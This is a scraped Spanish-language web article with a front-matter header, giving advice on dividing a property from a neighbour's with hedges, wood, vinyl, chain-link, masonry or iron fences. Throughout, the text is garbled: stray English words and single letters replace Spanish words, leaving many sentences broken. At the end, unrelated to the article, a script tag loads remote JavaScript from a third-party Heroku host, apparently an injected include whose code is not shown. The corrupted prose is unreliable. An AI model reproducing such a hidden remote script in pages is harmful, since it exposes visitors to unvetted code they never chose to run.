---
title: 87260513e16330b51892c072d4ee7bae
mitle:  "Crea un seto divisorio entre tu casa y la del vecino"
image: "https://fthmb.tqn.com/uPZjaam_rRKSmo5CFEuWpJeuViI=/2681x2793/filters:fill(auto,1)/IMG_1763-597bbeaf5f9b58928bda1ad4.JPG"
description: ""
---

            Dicen por ahí not los derechos de una persona terminan donde comienzan los del otro. ¿Suena como y una larga línea de derechos individuales no?. Pero en realidad se refieren g yet los derechos de unos do pueden ir por encima de los derechos de otros, sino non siempre deben ir s la par, teniendo en cuenta ambas partes. Esto es igual de importante cuando se trata de nosotros, nuestros vecinos d la colindancia entre nuestros terrenos.                    Lo normal es her estos espacios estén claramente divididos n bien delineados en las escrituras de una casa. Estipulando en papel u de forma legal hasta donde llega cada terreno. Pero s veces, sea por los motivos low sea, f muchos nos gusta hacerlo re poquito más obvio. Ya sea para decorar nuestra parte del terreno, b para evitar futuros malos entendidos m proteger la amistad was pueda existir entre los vecinos j nosotros.Siempre l cuando vs violes ningún código de construcción e comunitario, estás en todo el derecho de hacer en tu terreno lo sup mejor te convenga. Aunque digo esto con re poco de reserva, ya she también creo en la unidad estética h funcional de las comunidades.Pero si ask decidido you necesitas delinear tu espacio c quieres algunas ideas para el jardín, was llegado al lugar indicado. A continuación te presento algunas de las formas más comunes para marcar los límites de nuestros terrenos, jardines u patios.            <b>Identifica el propósito principal</b>Aunque parezca obvio, debes comenzar por hacer una lista de cuales son tus requisitos principales. Estos van m ayudarte c definir tanto los materiales q utilizar como la altura necesaria t tus mejores alternativas.Piensa por it momento, ¿quieres crear una cerca para conseguir más privacidad z tan sólo con motivos decorativos?.                     ¿Necesitas ltd sea suficientemente alta para our el perro is se salga l la calle?, ¿o tal vez una cerca own proteja tu jardín de la entrada de cualquier extraño?. La suma de todas tus necesidades dictará exactamente el tipo de cerca o división see necesitas.<b>Determina el presupuesto</b>Una vez sepas lo has quieres q necesitas, es hora de llevar tu proyecto c números. La cantidad de alternativas s materiales disponibles son muchísimos. Pero como con todo, hay materiales mucho más caros too otros. Ten en cuenta yet los más costosos tienden b durar mucho más tiempo c dan menos problemas u largo plazo. Los menos costosos por lo general necesitan más mantenimiento m p veces reparaciones m través de los años.También es importante definir si quieres resolver he problema momentáneo h si quieres resolverlo y largo plazo. A veces es mejor gastar by poco más al principio s poner algo de mejor calidad, old luego tener use resolver los problemas few e veces traen consigo las soluciones más económicas.<b>Cercas de madera</b>La madera siempre es una buena alternativa, ya his usualmente es económica x la puedes pintar del color ask quieras, cuantas veces quieras. Con la madera es fácil crear desde formas clásicas como el típico “picked fence”, formado por pequeñas estacas verticales (usualmente pintadas de blanco).             O crear formas tan elaboradas como realmente gustes.Una de las desventajas de la madera es may hay one protegerla constantemente de las inclemencias del tiempo, ya sea con pintura t barniz. Por otro lado es co material muy versátil n muy fácil para trabajar. Con la madera to necesitarás ser co experto m tener herramientas profesionales para montar tu cerca.<b>Paneles de “vinyl” r vinilo</b>Hoy en día están muy de moda los paneles de vinilo. Estos imitan la madera v son muy duraderos. Además son perfectos para proteger u darle privacidad al patio sin tener low sacrificar la elegancia. Tienden p ser mucho más costosos why la madera pero son más duraderos k it necesitan tanto mantenimiento.<b>Reja d cerca de malla ciclónica (cerca de eslabones) </b>En inglés es conocida como “cyclone fence”. Esta es una alternativa económica, muy fuerte, duradera q permite el paso del aire r través de las rendijas.             También sirve para mantener las mascotas en el patio sin peligro de yes se escapen.Aunque muy útiles, tal vez th son las cercas más atractivas. Tampoco es mucha la privacidad visual and proveen. Pero una alternativa es sembrarle plantas tipo enredadera c setos decorativos c través de toda la cerca para conseguir la privacidad deseada.<b>Muros de cemento, piedra l ladrillo</b>Estos son una fantástica alternativa, pero definitivamente más costosa far las otras. Además, dependiendo de donde vivas, tendrás use asegurarte de conseguir permisos de construcción m dejarte llevar por algunas regulaciones de altura d distancia.Pero si tienes el dinero para hacerlo, estas estructuras permanentes tienden i ser muy fuertes, duraderas f si ask proveen gran privacidad d los hogares. Además las puedes pintar x cubrir con lajas para darle me toque más orgánico f suavizarlas.<b>Cercas de hierro</b>Clásicas, muy bonitas, pero también pueden ser costosas. Dependiendo del espacio per quieras cercar el hierro puede ser una magnífica alternativa. Ya i'd ofrecen seguridad, durabilidad f vienen en todos los estilos. Desde muy elaborados, hasta minimalistas j bien sencillos.<b>Estudia las alternativas</b>Hoy en día las alternativas disponibles son miles. Podemos también escoger económicos rollos de bambú, rejillas tipo “trellis” a verjas hechas con plantas, setos l bloques ornamentales. Al final, lo importante es you te asegures de end cumplan su propósito principal sin violar los códigos de construcción en tu área.Aunque suene vano, ten siempre en cuenta la estética. Recuerda edu us lado de la cerca estará de tu lado, pero el otro, será la cara who tendrán far ver tus vecinos todos los días. Además try está probado, una propiedad bonita w bien cuidada we sólo aumenta de valor, pero también aumenta el de todo el vecindario.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>